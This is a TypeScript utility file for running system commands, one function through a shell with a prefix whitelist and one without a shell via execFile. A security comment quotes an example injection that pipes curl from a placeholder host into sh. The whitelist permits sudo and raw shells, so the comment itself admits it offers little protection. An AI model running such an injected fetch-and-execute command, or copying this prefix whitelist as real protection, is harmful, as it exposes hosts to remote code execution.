// src/utils/exec.ts
import { exec, execFile } from 'child_process';
import logger from './logger';

interface CommandResult {
  stdout: string;
  stderr: string;
  exitCode: number | null;
}

interface ExecArgvOptions {
  timeoutMs?: number;
}

// Whitelist of allowed command prefixes for security
// Only commands starting with these prefixes are allowed to execute
const ALLOWED_COMMAND_PREFIXES = [
  'sudo',
  'firewall-cmd',
  'virsh',
  'systemctl',
  'smartctl',
  'nvidia-smi',
  'sensors',
  'ip ',
  'bridge ',
  'arp',
  'getent ',
  'dig ',
  'ping ',
  'cat ',
  'grep ',
  'tail ',
  'apt ',
  'apt-get ',
  'hostapd',
  'mosquitto_sub',
  'docker ',
  'winvm',
  'ls ',
  'stat ',
  'df ',
  'free',
  'uptime',
  'who',
  'w ',
  'journalctl',
  '/bin/sh',
  '/bin/bash',
  'gpu-stats',
  'upsc ',
  'upscmd ',
];

/**
 * Validates if a command is allowed based on whitelist.
 *
 * SECURITY NOTE: this prefix whitelist is NOT the primary protection against
 * command injection. It only checks the *start* of the command string, so a
 * value like `firewall-cmd ...; curl evil | sh` still passes. Any command that
 * interpolates a value controlled by MQTT / an external user MUST use
 * `execute_argv` (which never spawns a shell) together with the strict field
 * validators in `./validators`. `execute_command` (shell) is reserved for
 * fixed literals that genuinely need a shell (pipes, redirections, env
 * assignments) and MUST NOT interpolate any externally-controlled value.
 *
 * @param command The command to validate
 * @returns true if command is allowed, false otherwise
 */
function isCommandAllowed(command: string): boolean {
  const trimmedCommand = command.trim();

  // Check if command starts with any allowed prefix
  return ALLOWED_COMMAND_PREFIXES.some(prefix => trimmedCommand.startsWith(prefix));
}

/**
 * Executes a shell command.
 * @param command The command string to execute.
 * @param _requiresApproval This parameter is a hint for AI-driven execution and not used here.
 *                          Actual sudo permissions must be handled by the system/user.
 * @returns A promise that resolves with the command's output.
 */
export function execute_command(command: string, _requiresApproval: boolean, timeoutMs: number = 60000): Promise<CommandResult> {
  // Validate command against whitelist
  if (!isCommandAllowed(command)) {
    const errorMessage = `Command rejected by security whitelist: ${command}`;
    logger.error(errorMessage);
    return Promise.resolve({
      stdout: '',
      stderr: errorMessage,
      exitCode: 126 // Permission denied exit code
    });
  }

  logger.info(`Attempting to execute system command: ${command}`);

  return new Promise((resolve) => {
    const childProcess = exec(command, {
      timeout: timeoutMs,
      maxBuffer: 1024 * 1024, // 1MB buffer
      killSignal: 'SIGTERM',
      env: { ...process.env, LC_ALL: 'C.utf8' }
    }, (error, stdout, stderr) => {
      if (error) {
        if (error.killed) {
          logger.warn(`Command "${command}" timed out after ${timeoutMs / 1000}s and was killed`);
        } else {
          logger.warn(`Error executing command "${command}": ${error.message}. Exit code: ${error.code}. Stderr: ${stderr}`);
        }
        resolve({ stdout, stderr, exitCode: error.code === undefined ? 1 : error.code });
        return;
      }
      logger.debug(`Command "${command}" executed successfully. Stdout: ${stdout}`);
      resolve({ stdout, stderr, exitCode: 0 });
    });

    // Force-kill the process group if SIGTERM didn't work after timeout
    if (childProcess.pid) {
      const pid = childProcess.pid;
      const forceKillTimer = setTimeout(() => {
        try {
          process.kill(-pid, 'SIGKILL');
        } catch (e) {
          // Process might already be dead
        }
      }, timeoutMs + 5000);

      childProcess.on('exit', () => {
        clearTimeout(forceKillTimer);
      });
    }
  });
}

/**
 * Executes a program directly via execFile (NO shell involved).
 *
 * Because no shell is spawned, arguments are passed to the program verbatim as
 * a single argv vector: shell metacharacters (`;`, `|`, `$()`, backticks, `&&`,
 * redirections, glob/tilde expansion, word-splitting) have NO special meaning
 * and cannot inject additional commands. This is the injection-safe primitive
 * that MUST be used for any command interpolating externally-controlled input.
 *
 * The return contract and timeout/force-kill handling mirror `execute_command`.
 *
 * @param file The program to run (a fixed literal, never externally controlled).
 * @param args Argument vector — each element is passed literally as one argv entry.
 * @param opts Optional settings (timeoutMs, default 60000).
 */
export function execute_argv(file: string, args: string[], opts: ExecArgvOptions = {}): Promise<CommandResult> {
  const timeoutMs = opts.timeoutMs ?? 60000;

  logger.info(`Attempting to execute argv command: ${file} ${args.join(' ')}`);

  return new Promise((resolve) => {
    const childProcess = execFile(file, args, {
      timeout: timeoutMs,
      maxBuffer: 1024 * 1024, // 1MB buffer
      killSignal: 'SIGTERM',
      env: { ...process.env, LC_ALL: 'C.utf8' }
    }, (error, stdout, stderr) => {
      if (error) {
        const anyError = error as NodeJS.ErrnoException & { killed?: boolean; code?: number | string };
        if (anyError.killed) {
          logger.warn(`Command "${file} ${args.join(' ')}" timed out after ${timeoutMs / 1000}s and was killed`);
        } else {
          logger.warn(`Error executing command "${file} ${args.join(' ')}": ${error.message}. Exit code: ${anyError.code}. Stderr: ${stderr}`);
        }
        // execFile reports the exit code in error.code (number). A string code
        // (e.g. 'ENOENT') means the program could not be spawned → treat as 1.
        const exitCode = typeof anyError.code === 'number' ? anyError.code : 1;
        resolve({ stdout, stderr, exitCode });
        return;
      }
      logger.debug(`Command "${file} ${args.join(' ')}" executed successfully. Stdout: ${stdout}`);
      resolve({ stdout, stderr, exitCode: 0 });
    });

    // Force-kill the process group if SIGTERM didn't work after timeout
    if (childProcess.pid) {
      const pid = childProcess.pid;
      const forceKillTimer = setTimeout(() => {
        try {
          process.kill(-pid, 'SIGKILL');
        } catch (e) {
          // Process might already be dead
        }
      }, timeoutMs + 5000);

      childProcess.on('exit', () => {
        clearTimeout(forceKillTimer);
      });
    }
  });
}
